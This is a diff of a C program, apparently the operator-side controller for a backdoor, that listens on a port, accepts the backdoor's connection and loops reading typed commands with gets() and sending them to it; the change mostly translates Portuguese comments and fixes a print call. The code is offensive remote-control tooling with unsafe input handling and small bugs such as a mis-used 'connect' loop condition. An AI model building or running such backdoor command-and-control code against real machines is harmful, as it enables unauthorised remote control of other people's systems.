@@ -52,24 +52,29 @@ int main()
         listen(skt,1);
         printf("\n listening on port: %d\n\n",porta);
 
-        /*RECEBE NOVAS CONEXÕES*/
+        /*recv connection */
 
         skt = accept(skt,(struct sockaddr *)&serv,&tskt);
         printf("\n connection with backdoor stabilished\n adress: %s\n\n",inet_ntoa(serv.sin_addr));
 
-        /*RECEBE RESPOSTA DO BACKDOOR*/
+       /*send some data to backdoor */
+       // strcpy(mensagem,bytes);
+        //send(skt,mensagem,strlen(mensagem), 0);
+
+        /*recv from backdoor*/
         buf = recv(skt, mensagem,bytes, 0);
         mensagem[buf]=0x00;
         printf("\n%s\n",mensagem);
 
 
-        /*LOOP DE COMUNICAÇÃO ENTRE CLIENTE E SERVIDOR*/
+        /*loop between server and backdoor
+        */
         do {
 
-        //recebe
+        //recv
         buf = recv(skt,mensagem,bytes,0);
         mensagem[buf]=0x00;
-        fprintf("%s\n",mensagem);
+        printf("%s\n",mensagem);
 
         /* SEND */
         fprintf(stdout,"send command to backdoor: ");
@@ -77,12 +82,12 @@ int main()
         gets(mensagem);
         send(skt, mensagem, strlen(mensagem), 0);
 
-        } 
-        
+        }
+
         while(connect != true);
 
         close(skt);
         printf(">> Connection finished....\n\n",inet_ntoa(serv.sin_addr));
         exit(EXIT_SUCCESS);
-    
+
     }
